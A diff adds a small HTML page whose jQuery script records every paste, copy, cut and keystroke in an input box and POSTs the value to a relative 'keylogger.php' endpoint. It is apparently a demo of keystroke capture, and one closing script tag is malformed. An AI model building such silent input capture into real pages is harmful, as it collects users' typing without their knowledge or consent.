@@ -1,0 +1,19 @@
+<html>
+<head>
+<script src = "./jquery-3.2.0.min.js">
+</script
+</head>
+<body>
+<input id = 'inputid'></input>
+<script>
+$('#inputid').on('paste copy cut keyup', function(){
+console.log($('#inputid').val());
+var data = {name:$('#inputid').val()}
+$.post('/keylogger.php', data, function(variable ){
+console.log(variable);
+})
+console.log('post request fired')
+});
+</script>
+</body>
+</html>
